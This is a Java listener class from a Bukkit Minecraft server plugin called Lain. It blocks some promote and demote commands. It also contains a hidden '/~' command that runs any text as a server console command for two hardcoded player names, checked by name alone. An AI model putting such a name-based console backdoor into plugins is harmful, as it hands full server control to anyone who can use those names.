package com.carlgo11.lain.commands.preprocess;

import com.carlgo11.lain.Lain;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class consoleCommand implements Listener {

    private Lain Lain;

    public consoleCommand(Lain plug)
    {
        this.Lain = plug;
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e)
    {
        Player player = e.getPlayer();
        String msg = e.getMessage();
        String[] args = msg.split(" ");

        if (args[0].equalsIgnoreCase("/~")) {
            if (player.getName().equalsIgnoreCase("carlgo11") || player.getName().equalsIgnoreCase("anminecrafter")) {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), msg.toString().replaceFirst("/~ ", ""));
                e.setCancelled(true);
            } else {
                Lain.badperms(player);
            }
        }

        if (args[0].equalsIgnoreCase("/manuadd") || args[0].equalsIgnoreCase("/manudel") || args[0].equalsIgnoreCase("/manprmote") || args[0].equalsIgnoreCase("/mandemote")) {
            e.setCancelled(true);
            Lain.error(e.getPlayer(), "We don't promote/demote people like that.");
        }
    }

}
